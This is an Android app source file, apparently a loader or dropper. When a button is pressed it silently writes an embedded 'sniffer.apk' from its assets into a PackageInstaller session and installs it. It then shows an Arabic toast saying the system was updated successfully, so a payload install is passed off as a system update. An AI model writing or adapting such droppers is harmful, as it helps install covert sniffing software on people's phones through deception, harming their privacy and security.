package com.v8.global.sniffer;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInstaller;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends AppCompatActivity {

    private static final String ACTION_INSTALL_COMPLETE = "com.v8.loader.INSTALL_COMPLETE";

    // المستمع اللي يلقف رسالة النظام ويفتح نافذة التثبيت
    private final BroadcastReceiver installReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (ACTION_INSTALL_COMPLETE.equals(intent.getAction())) {
                int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE);
                String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                
                if (status == PackageInstaller.STATUS_SUCCESS) {
                    Toast.makeText(context, "تم تحديث النظام بنجاح! ✅", Toast.LENGTH_LONG).show();
                } else if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
                    // تم تصحيح الخطأ هنا: استخدمنا Intent.EXTRA_INTENT
                    Intent confirmationIntent = (Intent) intent.getParcelableExtra(Intent.EXTRA_INTENT);
                    if (confirmationIntent != null) {
                        confirmationIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(confirmationIntent);
                    }
                } else {
                    Toast.makeText(context, "فشل التثبيت: " + message, Toast.LENGTH_LONG).show();
                }
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installReceiver, new IntentFilter(ACTION_INSTALL_COMPLETE), Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(installReceiver, new IntentFilter(ACTION_INSTALL_COMPLETE));
        }

        Button btnInstall = findViewById(R.id.btn_perm);
        btnInstall.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    InputStream is = getAssets().open("sniffer.apk");
                    Toast.makeText(MainActivity.this, "جاري تحضير الملف...", Toast.LENGTH_SHORT).show();
                    installPackage(MainActivity.this, is);
                } catch (Exception e) {
                    Toast.makeText(MainActivity.this, "الملف غير موجود بالـ assets: " + e.getMessage(), Toast.LENGTH_LONG).show();
                }
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try {
            unregisterReceiver(installReceiver);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void installPackage(Context context, InputStream in) {
        try {
            PackageInstaller installer = context.getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                    PackageInstaller.SessionParams.MODE_FULL_INSTALL);

            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);

            OutputStream out = session.openWrite("V8_Session", 0, -1);
            byte[] buffer = new byte[65536];
            int n;
            while ((n = in.read(buffer)) != -1) {
                out.write(buffer, 0, n);
            }
            session.fsync(out);
            out.close();

            Intent intent = new Intent(ACTION_INSTALL_COMPLETE);
            // استخدمنا FLAG_MUTABLE لضمان التوافق مع أندرويد 12 فما فوق
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    context, 
                    sessionId, 
                    intent, 
                    PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
            
            session.commit(pendingIntent.getIntentSender());
            session.close();
            
        } catch (Exception e) {
            Toast.makeText(context, "خطأ برمجي: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
}
